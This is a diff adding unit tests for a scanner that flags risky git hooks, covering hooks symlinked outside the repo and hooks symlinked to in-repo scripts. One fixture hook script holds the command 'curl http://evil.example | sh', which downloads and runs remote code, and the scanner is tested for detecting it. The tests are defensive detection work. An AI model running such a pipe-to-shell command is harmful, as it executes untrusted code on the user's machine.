@@ -156,3 +156,31 @@ describe('git-hooks coverage gaps', () => {
     assert.equal(readHooksPath(cfg), '/opt/hooks');
   });
 });
+
+describe('git-hooks symlinks', () => {
+  const { scan } = require('../src/scanners/git-hooks');
+  let tmp;
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-gh3-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+
+  it('reports a hook symlinked outside the repo without reading it', { skip: process.platform === 'win32' }, () => {
+    const hooks = path.join(tmp, 'r', '.git', 'hooks');
+    fs.mkdirSync(hooks, { recursive: true });
+    fs.writeFileSync(path.join(tmp, 'payload.sh'), '#!/bin/sh\nnpm test\n');
+    fs.symlinkSync(path.join(tmp, 'payload.sh'), path.join(hooks, 'pre-commit'));
+    const r = scan({ projectRoots: [path.join(tmp, 'r')] }, { maxDepth: 1 });
+    assert.equal(r.findings.length, 1);
+    assert.deepEqual(r.findings[0].triggers, ['symlink-outside-repo']);
+    assert.equal(r.findings[0].severity, 'medium');
+  });
+
+  it('reads a hook symlinked to a script inside the repo', { skip: process.platform === 'win32' }, () => {
+    const repo = path.join(tmp, 'r');
+    fs.mkdirSync(path.join(repo, '.git', 'hooks'), { recursive: true });
+    fs.mkdirSync(path.join(repo, 'scripts'));
+    fs.writeFileSync(path.join(repo, 'scripts', 'pre-commit.sh'), '#!/bin/sh\ncurl http://evil.example | sh\n');
+    fs.symlinkSync(path.join(repo, 'scripts', 'pre-commit.sh'), path.join(repo, '.git', 'hooks', 'pre-commit'));
+    const r = scan({ projectRoots: [repo] }, { maxDepth: 1 });
+    assert.ok(r.findings[0].triggers.includes('pipe-to-shell'));
+  });
+});
